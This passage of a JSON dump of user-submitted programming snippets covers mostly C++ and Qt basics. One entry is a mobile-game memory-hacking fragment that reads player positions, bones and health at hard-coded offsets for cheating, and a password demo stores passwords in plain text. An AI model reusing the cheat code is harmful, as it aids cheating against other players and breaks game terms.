    "description": "#include <stdio.h>  int main(void) {     int rows, cols;     do     {           printf(\"Give me the number of rows :\");           scanf(\"%d\",&rows);     }while(rows<1);     do     {           printf(\"Give me the number of cols :\");           scanf(\"%d\",&cols);     }while(cols<1);     int arr[rows][cols];     printf(\"\\nThe filling of the Matrix :\\n\");     for (int i = 0; i < rows; i++)     {         for (int j = 0; j < cols; j++)         {             scanf(\"%d\", &arr[i][j]);         }     }     int i_max = 0,j_max=0;     int i_min = 0,j_min=0;     int max=arr[0][0];     int min=arr[0][0];     for (int i = 0; i < rows; i++)     {         for (int j = 0; j < cols; j++)         {             if (arr[i][j]>max)             {                 max=arr[i][j];                 i_max=i;// i_max mean's the index i of the maximum element                 j_max=j;// j_max mean's the index j of the maximum element             }             if(arr[i][j]<min)             {                 min=arr[i][j];                 i_min=i;// i_max mean's the index i of the minimum element                 j_min=j;// j_max mean's the index j of the minimum element             }         }     }     printf(\"\\nDisplay of the Matrix before the swap :\\n\");     for (int i = 0; i < rows; i++)     {printf(\"\\n\");         for (int j = 0; j < cols; j++)         {              printf(\"[%d]\", arr[i][j]);         }     }      int temp=arr[i_min][j_min];     arr[i_min][j_min]=arr[i_max][j_max];     arr[i_max][j_max]=temp;      printf(\"\\n\\nDisplay of the Matrix after the swap :\\n\");      for (int i = 0; i < rows; i++)     {printf(\"\\n\");         for (int j = 0; j < cols; j++)         {             printf(\"[%d]\", arr[i][j]);         }     }     return 0; } \n",
    "reg_date": "2021-10-12T11:42:46.000Z"
  },
  {
    "id": 3411,
    "keyword": null,
    "link": null,
    "title": " programa para saber si un numero es primo",
    "description": "#include<bits/stdc++.h> using namespace std; bool Is_Prime(long long x){ \tif(x%2==0)return false; \tfor(int i=3;i*i<=x;i+=2) \t\tif(x%i==0)return false; \treturn true; } int main(){ \tlong long x; \tcin>>x; \tif(Is_Prime(x))cout<<\"Is Prime\"; \telse cout<<\"Is not Prime\"; }\n",
    "reg_date": "2021-10-12T11:42:46.000Z"
  },
  {
    "id": 3412,
    "keyword": null,
    "link": null,
    "title": " programs using vectors in c++",
    "description": "#include<iostream>   #include<vector>   using namespace std;   int main()   {   vector<string> v1;   v1.push_back(\"vectors\");   v1.push_back(\"are useful\");   for(vector<string>::iterator itr=v1.begin();itr!=v1.end();++itr)   cout<<*itr;   return 0;    }  \n",
    "reg_date": "2021-10-12T11:42:46.000Z"
  },
  {
    "id": 3413,
    "keyword": null,
    "link": null,
    "title": " project of password in c++ with file handling",
    "description": "#include<bits\\stdc++.h> // This Heider file can be ude instead of all oher heiderfiles #include<fstream> using namespace std; void code_function (){ \t \t\tint count = 4 ; \tstring pass_store;  \tofstream password;  cout<<\"Set a new password :\"<<endl; password.open(\"D:\\\\Password.txt \" , ios :: app ); // this is location of your file , and ios :: app will remain the after it excuate mant times  getline(cin,pass_store); password<<endl<<pass_store; \tstring pass_comp ; \t \tdo { \t\tifstream password; \tpassword>>pass_store; \tcout<<\"Enter Password :\"; \tgetline(cin,pass_comp); \tif ( pass_store == pass_comp ){ \t\t \t\tcout<<\"Password Entered Successfull \"<<endl; \t\tbreak; \t} \telse if (pass_store != pass_comp){ \t\tcout<<\"Wrong Password \"<<endl; \t\tcount -=1; \t \t\tcout<<count <<\" tries remaning\"<<endl; \t} \telse  \tcout<<\"invalid Input!\"<<endl; \t \t} while (count != 0); \t\t }  int main(){ \tcode_function(); \t  return 0; } // By Muhammad Najaf Shafee from D G khan  \n",
    "reg_date": "2021-10-12T11:42:47.000Z"
  },
  {
    "id": 3414,
    "keyword": null,
    "link": null,
    "title": " pros millis()",
    "description": "void opcontrol() {   std::uint32_t now = pros::millis();   while (true) {     // Do opcontrol things     pros::Task::delay_until(&now, 2);   } } \n",
    "reg_date": "2021-10-12T11:42:47.000Z"
  },
  {
    "id": 3415,
    "keyword": null,
    "link": null,
    "title": " protected in c++",
    "description": "#include <iostream> // Visibility is how visible certain members or methods of class are , who can see them ,who can call them and who can use them //Visibility has no effect on performance of your program it is ust for organizing code //Three basic visibility modifers are: //1 private //2 public //3 protected //default visibility of a struct is public //default visibility of class is private  class Entity { protected://means all sub classes and base class can access these functions and variables butcan't be accessed outside classes \tint P; \tvoid InitP () { \t\tP = 0; \t\t//initializes P to 0 \t} public://Pubic methods and variables can be accessed inside and outside of the class \tint a, b; \tvoid Init() { \t\ta = 0; \t\tb = 0; \t} private://only entity class can read and write the variables exeption is friend \tint X , Y; \tvoid print(){ \t\t// Content \t\t// only this function can be acessed inside the class unless you use friend keyword \t} public: \tEntity() { \t\tX = 0;// can initialize x inside the class but can't access it from outside the class unsless you use friend keyword  \t}  }; class Player : public Entity// class palyer is a sub class of  class Entity { public: \tPlayer() { \t\t//X = 2;\t// Error can't access the private members from base class \t\t//print();\t// can't access it in sub class because it is private  \t\ta = 1;\t// can acces it because it is public in base class \t\tb = 1;\t// can acces it because it is public in base class \t\tInit(); // can acces it because it is public in base class \t\tP = 0;\t// can access it in subclass because its visibility is protected \t\tInitP(); //can access it in subclass because its visibility is protected \t} \t  }; int main() { \tEntity e1; \tPlayer a; \t//e1.x;\t//error can't access private members from here \t//e1.print(); // error inaccessible due to its visibility being private \te1.a = 5;//can access from here because it's visibility is public  \te1.Init();//can access from here because it's visibility is public \ta.a = 5;//can access from here because it's visibility in base class is public  \ta.Init();//can access from here because it's visibility in base class is public \t//e1.P;\t//can't access it because  visibility is protected \t//e1.InitP; //can't access it because  visibility is protected \t// a.P;\t\t//can't access it because  visibility is protected in base class \t// a.InitP; //can't access it because  visibility is protected in base class \tstd::cin.get();\n",
    "reg_date": "2021-10-12T11:42:47.000Z"
  },
  {
    "id": 3416,
    "keyword": null,
    "link": null,
    "title": " pubg mobile memory hacking examples-master",
    "description": "DWORD NavMesh = dGet(Entities[i]->entityAddv + 312); Entities[i]->position = v3fGet(NavMesh + 0x150); Entities[i]->onEntiyPositionChanged(); Entities[i]->velocity = v3fGet(NavMesh + 0x1A0); Entities[i]->onEntiyVelocityChanged();  Entities[i]->playerWorld = dGet(entityAddv + 0x138);  // Thats UFT16 wchar strcpy(Entities[i]->playerName, strGet(dGet(entityAddv + 0x5E8), iGet(entityAddv + 0x5EC) * 2)); strcpy(Entities[i]->playerFlag, strGet(dGet(entityAddv + 0x5F4), 4)); strcpy(Entities[i]->playerID, strGet(dGet(entityAddv + 0x604), 22));  Entities[i]->playerStatus = iGet(Entities[i]->playerWorld + 0x364); Entities[i]->playerTeamId = iGet(entityAddv + 0x610); Entities[i]->itsMe = 0; if(entityAddv == uMyObject){    myTeamID = Entities[i]->playerTeamId;    MeEntity = Entities[i];    Entities[i]->itsMe = 1; } Entities[i]->itsFriend = 0; if(myTeamID == Entities[i]->playerTeamId){    Entities[i]->itsFriend = 1; } Entities[i]->playerIsBot = iGet(entityAddv + 0x2B4) == 0 ? true : false; DWORD tmpAddv = dGet(entityAddv + 0x308); Entities[i]->bodyAddv = tmpAddv + 0x140; Entities[i]->boneAddv = dGet(tmpAddv + 0x580) + 0x30;   Entities[i]->rotation = fGet(Entities[i]->playerWorld + 0x128); // ROTATE  /* PSOE Ites not ineger, bytes, but we will read as integer. 1144306736 standing  1143847984 crouched   1143684144 creep */ Entities[i]->playerPose = iGet(Entities[i]->playerWorld + 0x130);   Entities[i]->playerHealth.max = fGet(Entities[i]->entityAddv + 0x77C); Entities[i]->playerHealth.cur = fGet(Entities[i]->entityAddv + 0x778); Entities[i]->playerEnergy.max = fGet(Entities[i]->entityAddv + 0x1408); Entities[i]->playerEnergy.cur = fGet(Entities[i]->entityAddv + 0x140C);  DWORD weaponsCapsule = dGet(Entities[i]->entityAddv + 0x12C); Entities[i]->playerIsAttacking = false; for(int w = 0; w < 4; w++){    DWORD weaponBase = dGet(weaponsCapsule + w * 4);    DWORD weaponAmmoBase = dGet(weaponBase + 0x54);    Entities[i]->playerWeapons[w].activity = iGet(weaponBase + 0xDC);    Entities[i]->playerWeapons[w].state = iGet(weaponBase + 0x4C0);    Entities[i]->playerWeapons[w].entityId = iGet(dGet(weaponBase + 0x4BC) + 0xC0);    Entities[i]->playerWeapons[w].maxAmmo = iGet(weaponAmmoBase + 0x7D4);    Entities[i]->playerWeapons[w].curAmmo = iGet(weaponAmmoBase + 0x7D0); } // Bones Entities[i]->boneActor = vectorBoneRead(Entities[i]->bodyAddv); for(int b = 0; b < 15; b++){    Entities[i]->playerBones[b] = getPlayerBone(Entities[i]->boneAddv, Entities[i]->boneActor, i, b); }\nDWORD NavMesh = dGet(Entities[i]->entityAddv + 312); Entities[i]->position = v3fGet(NavMesh + 0x150); Entities[i]->onEntiyPositionChanged();   Entities[i]->velocity = v3fGet(dGet(Entities[i]->entityAddv + 0x54) + 0x78); Entities[i]->onEntiyVelocityChanged(); DWORD vehicleCommon = dGet(dGet(Entities[i]->entityAddv + 0x54) + 0x4D8); Entities[i]->vehicleHealth.max = fGet(vehicleCommon + 0x108); Entities[i]->vehicleHealth.cur = fGet(vehicleCommon + 0x10C); Entities[i]->vehicleFuel.max = fGet(vehicleCommon + 0x120); Entities[i]->vehicleFuel.cur = fGet(vehicleCommon + 0x124);\n",
    "reg_date": "2021-10-12T11:42:47.000Z"
  },
  {
    "id": 3417,
    "keyword": null,
    "link": null,
    "title": " public in c++",
    "description": "#include <iostream> // Visibility is how visible certain members or methods of class are , who can see them ,who can call them and who can use them //Visibility has no effect on performance of your program it is ust for organizing code //Three basic visibility modifers are: //1 private //2 public //3 protected //default visibility of a struct is public //default visibility of class is private  class Entity { protected://means all sub classes and base class can access these functions and variables butcan't be accessed outside classes \tint P; \tvoid InitP () { \t\tP = 0; \t\t//initializes P to 0 \t} public://Pubic methods and variables can be accessed inside and outside of the class \tint a, b; \tvoid Init() { \t\ta = 0; \t\tb = 0; \t} private://only entity class can read and write the variables exeption is friend \tint X , Y; \tvoid print(){ \t\t// Content \t\t// only this function can be acessed inside the class unless you use friend keyword \t} public: \tEntity() { \t\tX = 0;// can initialize x inside the class but can't access it from outside the class unsless you use friend keyword  \t}  }; class Player : public Entity// class palyer is a sub class of  class Entity { public: \tPlayer() { \t\t//X = 2;\t// Error can't access the private members from base class \t\t//print();\t// can't access it in sub class because it is private  \t\ta = 1;\t// can acces it because it is public in base class \t\tb = 1;\t// can acces it because it is public in base class \t\tInit(); // can acces it because it is public in base class \t\tP = 0;\t// can access it in subclass because its visibility is protected \t\tInitP(); //can access it in subclass because its visibility is protected \t} \t  }; int main() { \tEntity e1; \tPlayer a; \t//e1.x;\t//error can't access private members from here \t//e1.print(); // error inaccessible due to its visibility being private \te1.a = 5;//can access from here because it's visibility is public  \te1.Init();//can access from here because it's visibility is public \ta.a = 5;//can access from here because it's visibility in base class is public  \ta.Init();//can access from here because it's visibility in base class is public \t//e1.P;\t//can't access it because  visibility is protected \t//e1.InitP; //can't access it because  visibility is protected \t// a.P;\t\t//can't access it because  visibility is protected in base class \t// a.InitP; //can't access it because  visibility is protected in base class \tstd::cin.get();\n",
    "reg_date": "2021-10-12T11:42:47.000Z"
  },
  {
    "id": 3418,
    "keyword": null,
    "link": null,
    "title": " public private  protected c++",
    "description": "#include <iostream> // Visibility is how visible certain members or methods of class are , who can see them ,who can call them and who can use them //Visibility has no effect on performance of your program it is ust for organizing code //Three basic visibility modifers are: //1 private //2 public //3 protected //default visibility of a struct is public //default visibility of class is private  class Entity { protected://means all sub classes and base class can access these functions and variables butcan't be accessed outside classes \tint P; \tvoid InitP () { \t\tP = 0; \t\t//initializes P to 0 \t} public://Pubic methods and variables can be accessed inside and outside of the class \tint a, b; \tvoid Init() { \t\ta = 0; \t\tb = 0; \t} private://only entity class can read and write the variables exeption is friend \tint X , Y; \tvoid print(){ \t\t// Content \t\t// only this function can be acessed inside the class unless you use friend keyword \t} public: \tEntity() { \t\tX = 0;// can initialize x inside the class but can't access it from outside the class unsless you use friend keyword  \t}  }; class Player : public Entity// class palyer is a sub class of  class Entity { public: \tPlayer() { \t\t//X = 2;\t// Error can't access the private members from base class \t\t//print();\t// can't access it in sub class because it is private  \t\ta = 1;\t// can acces it because it is public in base class \t\tb = 1;\t// can acces it because it is public in base class \t\tInit(); // can acces it because it is public in base class \t\tP = 0;\t// can access it in subclass because its visibility is protected \t\tInitP(); //can access it in subclass because its visibility is protected \t} \t  }; int main() { \tEntity e1; \tPlayer a; \t//e1.x;\t//error can't access private members from here \t//e1.print(); // error inaccessible due to its visibility being private \te1.a = 5;//can access from here because it's visibility is public  \te1.Init();//can access from here because it's visibility is public \ta.a = 5;//can access from here because it's visibility in base class is public  \ta.Init();//can access from here because it's visibility in base class is public \t//e1.P;\t//can't access it because  visibility is protected \t//e1.InitP; //can't access it because  visibility is protected \t// a.P;\t\t//can't access it because  visibility is protected in base class \t// a.InitP; //can't access it because  visibility is protected in base class \tstd::cin.get(); }\n",
    "reg_date": "2021-10-12T11:42:47.000Z"
  },
  {
    "id": 3419,
    "keyword": null,
    "link": null,
    "title": " pure virtual function in c++",
    "description": "#include <iostream> #include  <string> //Pure virtual function  or inteface allows us to define a function in a base class that doesn't have an implementation or definition in the base class and force sub classes to implement that function //Pure virtual function is also called an interface in other languages class Entity { public: \t//virtual std::string GetName() { return \"Entity\"; }//This is a function that is just virtual .Overriding this function in sub class is optional we can instantiate subcllass without overriding  or implementing this function \t \t//Below is an example a Pure Virtual Function \t//It is an unimplemented function ant it forces the  sub class to implement it and define it \t//You will not be able to instantiate sub class without implementing or defining the function in sub class \tvirtual std::string GetName() = 0;    //the pure virtual function must have virtual written at the beginning and =0 at the end  //This function cannot contain any definition in base class,it is just a declaration }; class Player :public Entity { \tstd::string m_name;  public: \tPlayer(const std::string& name) \t\t:m_name(name) \t{}; \tvoid Print() { std::cout << \"This is Sub class\" << std::endl; }; \tstd::string GetName()override { return m_name; };//Pure virtual functions is implemented here in this sub class }; void PrintName(Entity* entity) {  \tstd::cout << entity->GetName() << std::endl; } int main() { \t//Entity a;//We can't do this because class Entity contains function that is unimplemented \tPlayer x(\"Jacob\");//This will work because we have implemented or defined the function in this sub class \tstd::cin.get(); }\n//Code by Soumyadeep Ghosh  //insta : @soumyadepp //linked in : https://www.linkedin.com/in/soumyadeep-ghosh-90a1951b6/ #include <bits/stdc++.h>  using namespace std;  class person {   string p_id;   public:   virtual void get_info()=0; //declaring person as abstract class   virtual void show()=0; };  class student:public person {   string name;   int roll_no;   public:   /*overriding the pure virtual function declared in base class otherwise     this class will become an abstract one and then objects cannot be created     for the same*/     void get_info()     {       cout<<\"Enter name of the student \"<<endl;       cin>>name;       cout<<\"Enter roll number of the student \"<<endl;       cin>>roll_no;     }    void show()    {      cout<<\"Name : \"<<name<<\" Roll number: \"<<roll_no<<endl;    } };  int main() {   person *p;   p=new student;   p->get_info();   p->show();   return 0; } \n#include <iostream> #include<string> \t//Virtual Functions are functions that allow us to override methods in subclasses //In this example  we have an entity class as a base class and class player inherits from public entity  class Entity { public: \tvirtual std::string GetName() { return \"Entity\"; }//It is a method in base class that we want to modify in sub class Player \tvoid Print() { std::cout << \"This is Base class\" << std::endl;}//function that is not virtual }; class Player :public Entity { \tstd::string m_name;  public: \tPlayer(const std::string& name) \t\t:m_name(name) \t{}; \tvoid Print() { std::cout << \"This is Sub class\" << std::endl; };//function that is not virtual \tstd::string GetName()override { return m_name; };//overriding the function in sub class };  int main() { \tEntity* e = new Entity(); \tstd::cout << e->GetName() << std::endl; \tPlayer* p = new Player(\"Jacob\"); \tstd::cout << p->GetName() << std::endl; \tPrintName(p);// This function calls the GetName method from the Player instance despite it takes an entity instance as a parameter this is because player class is a sub  class of Entity and the method is marked virtual it will map with the method in the Player class and call it from there .It outputs => Jacob \t//if It was not virtual it would have called The method From Entity Instance and output would be => Entity \tEntity* notvirtualentity = new Entity(); \tPlayer* notvirtualpalyer = new Player(\"XX\"); \tnotvirtualentity =  notvirtualpalyer; \tnotvirtualentity->Print();//It prints => this is base class if it was virtual function it would call print function from Player Class and print => This is subclass \tstd::cin.get(); }\n#include <iostream> #include <string>  class Entity { public:   virtual std::string getName();   void print();  };  virtual std::string Entity::getName() { \treturn \"Entity\"; }  void Entity::print() { \tstd::cout << \"This is the base class\" << std::endl; }  class Player : public Entity {   std::string m_name; public: \tPlayer(const std::string& name): m_name(name) {};   \tvoid print();   \tvirtual std::string getName(); };  virtual std::string Player::getName() { \treturn m_name; }  void Player::print() { \tstd::cout << \"This is the sub class\" << std::endl; }  int main() { \tEntity* e = new Entity();   \tstd::cout << e->getName() << std::endl;   \tPlayer* p = new Player(\"Jacob\");   \tstd::cout << p->getName() << std::endl;   \tp->print();   \te->print();      \tEntity* notVirtualEntity = new Entity();   \tPlayer* notVirtualPlayer = new Player(\"Bob\");   \tnotVirtualEntity = notVirtualPlayer;   \tnotVirtualEntity->print();   \tnotVirtualEntity->getName(); }\n",
    "reg_date": "2021-10-12T11:42:47.000Z"
  },
  {
    "id": 3420,
    "keyword": null,
    "link": null,
    "title": " push back a pair c++",
    "description": "revenue.push_back(std::make_pair(\"string\",map[i].second)); \n",
    "reg_date": "2021-10-12T11:42:47.000Z"
  },
  {
    "id": 3421,
    "keyword": null,
    "link": null,
    "title": " push back in STL in c++11",
    "description": "// vector::push_back #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   int myint;    std::cout << \"Please enter some integers (enter 0 to end):\\n\";    do {     std::cin >> myint;     myvector.push_back (myint);   } while (myint);    std::cout << \"myvector stores \" << int(myvector.size()) << \" numbers.\\n\";    return 0; }\n",
    "reg_date": "2021-10-12T11:42:47.000Z"
  },
  {
    "id": 3422,
    "keyword": null,
    "link": null,
    "title": " push pop code in c++",
    "description": "#include<iostream> using namespace std; #define Max 100 class stack{ \tpublic: \t\tint top; \t\tint size; \t\tint *s; \t\tint stack[Max]; \t\t \t\tvoid push() \t\t{ \t\t\tint value; \t\t\tif(top==size-1) \t\t\t{ \t\t\t\tcout<<\"overflow\"; \t\t\t} \t\t\telse \t\t\t{ \t\t\t\tcout<<\"Enter value to push \\n\"; \t\t\t\tcin>>value; \t\t\t\ttop++; \t\t\t\tstack[top]=value; \t\t\t} \t\t} \t\tint pop() \t\t{ \t\t\tif(top==-1) \t\t\t{ \t\t\t\tcout<<\"Underflow\"; \t\t\t} \t\t\telse \t\t\t{ \t\t\t\tcout<<\"Deleted value is \\n\"<<stack[top]; \t\t\t\ttop--; \t\t\t} \t\t} \t\tvoid display() \t\t{ \t\t\tint i; \t\t\tfor(i=top;i>=0;i--) \t\t\t{ \t\t\t\tcout<<stack[i]<<endl; \t\t\t} \t\t} }; int main() { \tstack st; \tcout<<\"Enter the size of the stack\"; \tcin>>st.size; \tst.s=new int[st.size]; \tst.top=-1; \tint ch; \twhile(st.size!=0) \t{\t \tcout<<endl<<\"    #####       STACK MENU     #####     \"<<endl; \tcout<<\"1. PUSH OPERATION \\n2. POP OPERATION \\n3. DISPLAY \\n4.Exit \\n\"; \tcin>>ch; \tswitch(ch) \t{ \t\tcase 1:  \t\t    st.push(); \t\t    break; \t\tcase 2: \t\t\tst.pop(); \t\t\tbreak; \t\tcase 3: \t\t\tst.display(); \t\t\tbreak; \t\tcase 4: \t\t\texit(0); \t\t\t \t\tdefault:cout<<\"\\n Choose correct option\"; \t} } return 0; }\n",
    "reg_date": "2021-10-12T11:42:48.000Z"
  },
  {
    "id": 3423,
    "keyword": null,
    "link": null,
    "title": " pycharm",
    "description": "Great choice my dude\npycharm is a cross-platform python IDE\nᴍᴀʏ ᴛʜᴇ ꜰᴏʀᴄᴇ ʙᴇ ᴡɪᴛʜ ʏᴏᴜ\nWHY ?! VS CODE IS BETTER YOUNG MASTER\nVery Smart Choice. PyCharm is epic\nyou are a woman with a very good taste\nYou chose like a god\nJetbrain's IDEs are the best in the World.                                         - Hiren Vadher\nYup good choice PyCharm best Python IDE\nBest IDE for Python. If you want to use something lightweight, use VS Code.\n",
    "reg_date": "2021-10-12T11:42:48.000Z"
  },
  {
    "id": 3424,
    "keyword": null,
    "link": null,
    "title": " pyqt connect",
    "description": "button.clicked.connect(slot_function) \n",
    "reg_date": "2021-10-12T11:42:48.000Z"
  },
  {
    "id": 3425,
    "keyword": null,
    "link": null,
    "title": " python isotropic points on a sphere",
    "description": "#include<random>#include<cmath>#include<chrono>int main(int argc, char *argv[]) {    // Set up random number generators    unsigned seed = std::chrono::system_clock::now().time_since_epoch().count();    std::mt19937 generator (seed);    std::uniform_real_distribution<double> uniform01(0.0, 1.0);    // generate N random numbers    int N = 1000;    // the correct way    FILE * correct;    correct = fopen(\"correct.csv\", \"w\");    fprintf(correct, \"Theta,Phi,x,y,z\\n\");    for (int i = 0; i < N; i++) {        // incorrect way        double theta = 2 * M_PI * uniform01(generator);        double phi = acos(1 - 2 * uniform01(generator));        double x = sin(phi) * cos(theta);        double y = sin(phi) * sin(theta);        double z = cos(phi);        fprintf(correct, \"%f,%f,%f,%f,%f\\n\", theta, phi, x, y, z);    }    fclose(correct);}\n",
    "reg_date": "2021-10-12T11:42:48.000Z"
  },
  {
    "id": 3426,
    "keyword": null,
    "link": null,
    "title": " python remove repeated characters from string",
    "description": ">>> foo = 'mppmt' >>> ''.join(sorted(set(foo), key=foo.index)) 'mpt'\ndef unique_list(l):     ulist = []     [ulist.append(x) for x in l if x not in ulist]     return ulist  a=\"calvin klein design dress calvin klein\" a=' '.join(unique_list(a.split()))\n''.join(list(dict.fromkeys(list(messagel))))\n",
    "reg_date": "2021-10-12T11:42:48.000Z"
  },
  {
    "id": 3427,
    "keyword": null,
    "link": null,
    "title": " q10",
    "description": "result = 8 - 5 * 3 + 9 - 10 / 2; \n",
    "reg_date": "2021-10-12T11:42:48.000Z"
  },
  {
    "id": 3428,
    "keyword": null,
    "link": null,
    "title": " qchar to char",
    "description": "QString str = \"hello grepper\" char letter = str[0].toLatin1(); //letter == 'h'\n",
    "reg_date": "2021-10-12T11:42:48.000Z"
  },
  {
    "id": 3429,
    "keyword": null,
    "link": null,
    "title": " qlabel font color",
    "description": "ui->labelName->setStyleSheet(\"color: #FF0000\");\n",
    "reg_date": "2021-10-12T11:42:48.000Z"
  },
  {
    "id": 3430,
    "keyword": null,
    "link": null,
    "title": " qlabel set text color",
    "description": "ui->labelName->setStyleSheet(\"color: #FF0000\");\n",
    "reg_date": "2021-10-12T11:42:49.000Z"
  },
  {
    "id": 3431,
    "keyword": null,
    "link": null,
    "title": " qpushbutton clicked connect c++",
    "description": "class A : public QWidget{    public slots: void handleButton();  }; \n   void A::handleButton(int row, int col){     m_button->setText(\"Example\");   // resize button     m_button->resize(100,100);       } \n",
    "reg_date": "2021-10-12T11:42:49.000Z"
  },
  {
    "id": 3432,
    "keyword": null,
    "link": null,
    "title": " qrandomgenerator bounded",
    "description": "//example QRandomGenerator::global()->bounded(10);//10 is excluded 0 is included QRandomGenerator::global()->bounded(10, 12);//10 is included 12 is excluded\n",
    "reg_date": "2021-10-12T11:42:49.000Z"
  },
  {
    "id": 3433,
    "keyword": null,
    "link": null,
    "title": " qstring get if empty",
    "description": "QString str = \"\"; if(str.size() == 0){ //if str is empty or null \t } else if(str.isEmpty()){ //if str is empty but not null \t } else if(str.isNull()){ //if str is empty and null \t }\n",
    "reg_date": "2021-10-12T11:42:49.000Z"
  },
  {
    "id": 3434,
    "keyword": null,
    "link": null,
    "title": " qstring insert character",
    "description": "//Inserts the QString str at the given index position and returns a reference //to this QString.  QString str = \"Meal\"; str.insert(1, QString(\"ontr\")); // str == \"Montreal\"\n",
    "reg_date": "2021-10-12T11:42:50.000Z"
  },
  {
    "id": 3435,
    "keyword": null,
    "link": null,
    "title": " qstring mid",
    "description": "//QString::mid(int startIndex, int howManyChar) QString x = \"Nine pineapples\"; QString y = x.mid(5, 4);            // y == \"pine\" QString z = x.mid(5);               // z == \"pineapples\"\n",
    "reg_date": "2021-10-12T11:42:50.000Z"
  },
  {
    "id": 3436,
    "keyword": null,
    "link": null,
    "title": " qt background color",
    "description": "setStyleSheet(\"background-color: white;\");\n",
    "reg_date": "2021-10-12T11:42:50.000Z"
  },
  {
    "id": 3437,
    "keyword": null,
    "link": null,
    "title": " qt can't use ^ operator on qchar",
    "description": "// ^ operator is not defined for QChar, you have to convert it to char first QChar a = 'x'; char b = a.toLatin1();  char c = b ^ 0x0f;\n",
    "reg_date": "2021-10-12T11:42:50.000Z"
  },
  {
    "id": 3438,
    "keyword": null,
    "link": null,
    "title": " qt debug",
    "description": "#include <QDebug>  qDebug() << \"debug message\" << Qt::endl;\n",
    "reg_date": "2021-10-12T11:42:51.000Z"
  },
  {
    "id": 3439,
    "keyword": null,
    "link": null,
    "title": " qt design editor hide window bottom white bar",
    "description": "// Rigth click on your window and click \"remove status bar\"\n",
    "reg_date": "2021-10-12T11:42:51.000Z"
  },
  {
    "id": 3440,
    "keyword": null,
    "link": null,
    "title": " qt disable resizing window",
    "description": "// in QMainWindow this->statusBar()->setSizeGripEnabled(false);\nvoid MyDialog::MyDialog() { \t// Qt::Widget, Qt::Window or Qt::Dialog.   setWindowFlags(Qt::Dialog | Qt::MSWindowsFixedSizeDialogHint); } \n",
    "reg_date": "2021-10-12T11:42:51.000Z"
  },
  {
    "id": 3441,
    "keyword": null,
    "link": null,
    "title": " qt double en qstring",
    "description": "double valueAsDouble = 1.2; QString valueAsString = QString::number(valueAsDouble);\n",
    "reg_date": "2021-10-12T11:42:51.000Z"
  },
  {
    "id": 3442,
    "keyword": null,
    "link": null,
    "title": " qt file explorer",
    "description": "fileName = QFileDialog::getOpenFileName(this,     tr(\"Open Image\"), \"/home/jana\", tr(\"Image Files (*.png *.jpg *.bmp)\"));\n",
    "reg_date": "2021-10-12T11:42:51.000Z"
  },
  {
    "id": 3443,
    "keyword": null,
    "link": null,
    "title": " qt float to qstring",
    "description": "float pi = 3.14;  QString b = QString::number(pi);\n",
    "reg_date": "2021-10-12T11:42:51.000Z"
  },
  {
    "id": 3444,
    "keyword": null,
    "link": null,
    "title": " qt get hexa value from qstring",
    "description": "const QString str = QLatin1String(\"AA110011\"); bool ok; const unsigned int parsedValue = str.toUInt(&ok, 16); //16 because hex is base 16 if (!ok) {     //Parsing failed, handle error here }\n",
    "reg_date": "2021-10-12T11:42:51.000Z"
  },
  {
    "id": 3445,
    "keyword": null,
    "link": null,
    "title": " qt how to make a file browser",
    "description": "QString fileName = QFileDialog::getOpenFileName(this, tr(\"Open File\"),                                                 \"/home\", tr(\"Images (*.png *.jpg)\") );\n",
    "reg_date": "2021-10-12T11:42:52.000Z"
  },
  {
    "id": 3446,
    "keyword": null,
    "link": null,
    "title": " qt insert image in widget",
    "description": "//you can use a QLabel mylabel.setPixmap(\"myFile.png\");\n",
    "reg_date": "2021-10-12T11:42:52.000Z"
  },
  {
    "id": 3447,
    "keyword": null,
    "link": null,
    "title": " qt int to string",
    "description": "int x = 56 QString str = QString::number(x); //str == \"56\"\nUse QString::number():  int i = 42; QString s = QString::number(i);\n",
    "reg_date": "2021-10-12T11:42:52.000Z"
  },
  {
    "id": 3448,
    "keyword": null,
    "link": null,
    "title": " qt label set text color",
    "description": "ui->labelName->setStyleSheet(\"color: #FF0000\");\n",
    "reg_date": "2021-10-12T11:42:52.000Z"
  },
  {
    "id": 3449,
    "keyword": null,
    "link": null,
    "title": " qt make widget ignore mouse events",
    "description": "theWidget->setAttribute(Qt::WA_TransparentForMouseEvents);\n",
    "reg_date": "2021-10-12T11:42:52.000Z"
  },
  {
    "id": 3450,
    "keyword": null,
    "link": null,
    "title": " qt messagebox",
    "description": "/**   * int output = QMessageBox::icon(this, tr(\"Title\"), tr(\"content\"),  *\t\t\t\t\t\t\t  QMessageBox::button, QMessageBox::defaultButton);  */ //for example : int ret = QMessageBox::warning(this, tr(\"My Application\"),                                tr(\"The document has been modified.\\n\"                                   \"Do you want to save your changes?\"),                                QMessageBox::Save | QMessageBox::Discard                                | QMessageBox::Cancel,                                QMessageBox::Save);\n",
    "reg_date": "2021-10-12T11:42:52.000Z"
  },
  {
    "id": 3451,
    "keyword": null,
    "link": null,
    "title": " qt popup window",
    "description": "/**   * You can use a QMessageBox like this:  * int output = QMessageBox::icon(this, tr(\"Title\"), tr(\"content\"),  *\t\t\t\t\t\t\t  QMessageBox::button, QMessageBox::defaultButton);  */ //for example : int ret = QMessageBox::warning(this, tr(\"My Application\"),                                tr(\"The document has been modified.\\n\"                                   \"Do you want to save your changes?\"),                                QMessageBox::Save | QMessageBox::Discard                                | QMessageBox::Cancel,                                QMessageBox::Save);\n",
    "reg_date": "2021-10-12T11:42:52.000Z"
  },
  {
    "id": 3452,
    "keyword": null,
    "link": null,
    "title": " qt qchar to char",
    "description": "QChar qLetter = 'a'; char letter = qLetter.toLatin1();\n",
    "reg_date": "2021-10-12T11:42:52.000Z"
  },
  {
    "id": 3453,
    "keyword": null,
    "link": null,
    "title": " qt qchar to lower",
    "description": "QChar a = 'C'; QChar b = a.toLower(); //b == 'c'\n",
    "reg_date": "2021-10-12T11:42:52.000Z"
  },
  {
    "id": 3454,
    "keyword": null,
    "link": null,
    "title": " qt qimage load from file",
    "description": "QImage* image = new QImage(); image->load(\"/path/to/your/file.png\");\n",
    "reg_date": "2021-10-12T11:42:53.000Z"
  },
  {
    "id": 3455,
    "keyword": null,
    "link": null,
    "title": " qt qmessagebox",
    "description": "/**   * int output = QMessageBox::icon(this, tr(\"Title\"), tr(\"content\"),  *\t\t\t\t\t\t\t  QMessageBox::button, QMessageBox::defaultButton);  */ //for example : int ret = QMessageBox::warning(this, tr(\"My Application\"),                                tr(\"The document has been modified.\\n\"                                   \"Do you want to save your changes?\"),                                QMessageBox::Save | QMessageBox::Discard                                | QMessageBox::Cancel,                                QMessageBox::Save);\n",
    "reg_date": "2021-10-12T11:42:53.000Z"
  },
  {
    "id": 3456,
    "keyword": null,
    "link": null,
    "title": " qt qstring to double",
